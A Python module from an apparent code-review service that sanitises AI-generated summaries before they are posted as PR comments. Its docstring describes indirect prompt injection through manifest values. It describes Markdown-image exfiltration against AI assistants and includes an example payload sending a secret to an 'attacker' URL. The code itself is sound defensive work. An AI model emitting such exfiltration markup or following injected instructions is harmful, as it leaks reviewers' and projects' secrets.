"""Making model output safe to paste into a PR comment.

Sliced out of diff_preview.py unchanged (COPS-2658 phase 6).

The AI summary is the one part of a comment this service does not write
itself, so it is the one part that can arrive with unbalanced code fences,
stray heading levels that break the comment's own structure, or markdown that
renders as something other than text. These two functions normalise it before
it is embedded.

`_fence_safe` is imported from redact, which owns the fence-balancing rule so
the redaction path and this path cannot disagree about it.
"""
import re

from redact import _fence_safe


def _sanitize_ai_summary(text: str) -> str:
    """Strip active/exfiltration Markdown from model output before it is
    posted as a PR comment.

    v2.5.19 (R6, community-research round): the AI summary is model output
    built from untrusted rendered manifest values, which makes it an indirect
    prompt-injection sink. The documented "Markdown image exfiltration"
    channel (Checkmarx, against Copilot Chat and Gemini) is zero-click: a
    model coaxed into emitting ![x](https://attacker/?d=<secret>) makes the
    reviewer's browser fetch that URL on render. Cross-vendor "Comment-and-
    Control" research showed AI review bots posting attacker-chosen content
    into PR comments. We do not trust the model not to be steered, so we
    strip, from its output only (never from our deterministic head line):
      - Markdown images ![alt](url) -> alt text kept, image dropped
      - raw HTML tags (img/picture/script/style/anchors/comments)
      - autolinked bare URLs left as text but de-linked from any image use
      - triple-backtick fences (the model must not open its own fences)
    The summary is advisory prose; none of these belong in it, so removing
    them cannot lose diff information.
    """
    if not text:
        return text
    t = text
    # Markdown image -> keep alt text, drop the URL entirely.
    t = re.sub(r'!\[([^\]]*)\]\([^)]*\)', r'\1', t)
    # HTML comments (hidden instructions) and any raw tags.
    t = re.sub(r'<!--.*?-->', '', t, flags=re.DOTALL)
    t = re.sub(r'</?[A-Za-z][^>]*>', '', t)
    # The model must never open a code fence in an advisory summary.
    t = _fence_safe(t)
    return t.strip()


def _normalize_ai_markdown(text: str) -> str:
    """Ensure the AI output renders correctly in Bitbucket Markdown.

    Bitbucket requires a blank line before a bullet list; without it
    the items render as inline text instead of a proper list.
    The model outputs single-newline separators which look fine in
    plain text but collapse into a wall of text in Bitbucket.
    """
    # Blank line before the first list item following non-list text.
    t = re.sub(r'([^\n])\n([ \t]*[-*] )', r'\1\n\n\2', text)
    # Blank line before the Critical/No-critical flag line.
    t = re.sub(r'\n([⚠✅][^⚠✅])', r'\n\n\1', t)
    return t.strip()
